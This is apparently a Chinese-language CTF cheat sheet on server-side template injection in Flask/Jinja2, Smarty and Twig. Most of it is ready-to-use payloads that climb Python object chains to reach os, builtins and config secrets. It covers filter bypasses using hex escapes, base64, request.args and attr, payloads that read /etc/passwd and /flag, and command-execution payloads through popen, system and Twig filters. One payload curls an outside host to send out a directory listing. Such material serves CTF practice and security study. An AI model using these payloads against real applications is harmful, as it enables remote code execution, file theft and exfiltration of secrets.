# flask/jinja
- flask SSTI的基本思路就是利用python中的魔术方法找到自己要用的函数
  ```
      __dict__ 保存类实例或对象实例的属性变量键值对字典
      __class__  返回类型所属的对象
      __mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。
      __bases__   返回该对象所继承的基类
      // __base__和__mro__都是用来寻找基类的
      
      __subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表
      __init__  类的初始化方法
      __globals__  对包含函数全局变量的字典的引用
  ```
- ### 一些姿势
  
  [浅析SSTI(python沙盒绕过)](https://bbs.ichunqiu.com/thread-47685-1-1.html?from=aqzx8)
- #### 1、config
  
  `{{config}}`可以获取当前设置，如果题目类似`app.config ['FLAG'] = os.environ.pop（'FLAG'）`，那可以直接访问`{{config['FLAG']}}`或者`{{config.FLAG}}`得到flag
- #### 2、self
  
  ```
  {{self}} ⇒ <TemplateReference None>
    {{self.__dict__._TemplateReference__context.config}} ⇒ 同样可以找到config
  ```
- #### 3、`""`、`[]`、`()`等数据结构
  
  主要目的是配合`__class__.__mro__[2]`这样找到`object`类  
  `{{[].__class__.__base__.__subclasses__()[68].__init__.__globals__['os'].__dict__.environ['FLAG']}}`
- #### 4、url\_for, g, request, namespace, lipsum, range, session, dict, get\_flashed\_messages, cycler, joiner, config等
  
  如果config，self不能使用，要获取配置信息，就必须从它的上部全局变量（访问配置current\_app等）。
  
  例如：
  ```
    {{url_for.__globals__['current_app'].config.FLAG}}
    {{get_flashed_messages.__globals__['current_app'].config.FLAG}}
    {{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['current_app'].config['FLAG']}}
  ```
- ### 常用绕过
  
  [Jinja2模板注入过滤器绕过](https://0day.work/jinja2-template-injection-filter-bypasses/)  
  [SSTI Flask 技巧进阶](https://www.jianshu.com/p/a736e39c3510)
  
  以下表示法可用于访问对象的属性：
  
  * `request.__class__`
  * `request["__class__"]`
  * `request|attr("__class__")`
  
  可以使用以下方法访问数组元素：
  
  * `array[0]`
  * `array.pop(0)`
  * `array.__getitem__(2)`
- #### (1)过滤`[]`和`.`
  
  只过滤`[]`
  
  > pop() 函数用于移除列表中的一个元素（默认最后一个元素），并且返回该元素的值。  
  > `''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/etc/passwd').read()`  
  > 若`.`也被过滤，使用原生JinJa2函数`|attr()`  
  > 将`request.__class__`改成`request|attr("__class__")`
  #### (2)过滤`_`
  
  利用`request.args`属性  
  `{{ ''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() }}&class=__class__&mro=__mro__&subclasses=__subclasses__`  
  将其中的`request.args`改为`request.values`则利用post的方式进行传参
- #### (3)关键字过滤
  
  * base64编码绕过  
  `__getattribute__`使用实例访问属性时,调用该方法
  
  例如被过滤掉`__class__`关键词  
  `{{[].__getattribute__('X19jbGFzc19f'.decode('base64')).__base__.__subclasses__()[40]("/etc/passwd").read()}}`
  
  * 字符串拼接绕过  
  `{{[].__getattribute__('__c'+'lass__').__base__.__subclasses__()[40]("/etc/passwd").read()}}`  
  `{{[].__getattribute__(['__c','lass__']|join).__base__.__subclasses__()[40]}}`
- #### (4)过滤`{{`
  
  使用`{% if ... %}1{% endif %}`，例如
  ```
    {% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://http.bin.buuoj.cn/1inhq4f1 -d `ls / |  grep flag`;') %}1{% endif %}
  ```
  如果不能执行命令，读取文件可以利用盲注的方法逐位将内容爆出来
  ```
    {% if ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/test').read()[0:1]=='p' %}1{% endif %}
  ```
- #### (5)引号内十六进制绕过
  ```
    {{"".__class__}}
    {{""["\x5f\x5fclass\x5f\x5f"]}}
  ```
  `_`是`\x5f`，`.`是`\x2E`
- #### (6)" ' chr等被过滤，无法引入字符串
  
  * 直接拼接键名
  
  dict(buil=aa,tins=dd)|join()
  
  * 利用`string`、`pop`、`list`、`slice`、`first`等过滤器从已有变量里面直接找
  
  (app.__doc__|list()).pop(102)|string()
  
  * 构造出`%`和`c`后，用格式化字符串代替`chr`
  
  {%set udl=dict(a=pc,c=c).values()|join %}      # uld=%c
  {%set i1=dict(a=i1,c=udl%(99)).values()|join %}
- #### (7)+等被过滤，无法拼接字符串
  
  * `~`  
  在jinja中可以拼接字符串
  * 格式化字符串  
  同上
- ### payload
  
  python2
  ```
    {{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__['open']('/etc/passwd').read()}}  
    {{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
    {{()["\x5F\x5Fclass\x5F\x5F"]["\x5F\x5Fbases\x5F\x5F"][0]["\x5F\x5Fsubclasses\x5F\x5F"]()[91]["get\x5Fdata"](0, "app\x2Epy")}}
    {{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__['eval']("__import__('os').system('whoami')")}}
    {{()["\x5F\x5Fclass\x5F\x5F"]["\x5F\x5Fbases\x5F\x5F"][0]["\x5F\x5Fsubclasses\x5F\x5F"]()[80]["load\x5Fmodule"]("os")["system"]("ls")}}
    {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
  ```
  python3
  ```
    {{().__class__.__bases__[0].__subclasses__()[177].__init__.__globals__.__builtins__['open']('/flag').read()}}
    {{().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__['eval']("__import__('os').popen('whoami').read()")}}
  ```
  不用找类  
  `{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}`
  
  以上思路都是找os，也可以找`__builtins__.eval`
- # Smarty
  ------
  
  以下内容出自[Smarty SSTI](https://www.jianshu.com/p/eb8d0137a7d3)
- ### 1、`{php}{/php}`
  
  Smarty已经废弃{php}标签，强烈建议不要使用。在Smarty 3.1，{php}仅在SmartyBC中可用
- ### 2、`{literal}`
  
  {literal}可以让一个模板区域的字符原样输出。这经常用于保护页面上的Javascript或css样式表，避免因为Smarty的定界符而错被解析。
  
  那么对于php5的环境我们就可以使用
  
  `<script language="php">phpinfo();</script>`
- ### 3、`{if}`
  
  Smarty的{if}条件判断和PHP的if 非常相似，只是增加了一些特性。每个{if}必须有一个配对的{/if}. 也可以使用{else} 和 {elseif}. 全部的PHP条件表达式和函数都可以在if内使用，如_||_,or,&&,and,is\_array(), 等等
  
  `{if phpinfo()}{/if}`
- ### 4、getStreamVariable
  
  新版本失效  
  `{self::getStreamVariable("file:///etc/passwd")}`
- # twig
  ----
  
  文件读取
  ```
    {{'/etc/passwd'|file_excerpt(1,30)}}
    
    {{app.request.files.get(1).__construct('/etc/passwd','')}}
    {{app.request.files.get(1).openFile.fread(99)}}
  ```
  rce
  ```
    {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
    
    {{['cat /etc/passwd']|filter('system')}}
    
    POST /subscribe?0=cat+/etc/passwd HTTP/1.1
    {{app.request.query.filter(0,0,1024,{'options':'system'})}}
  ```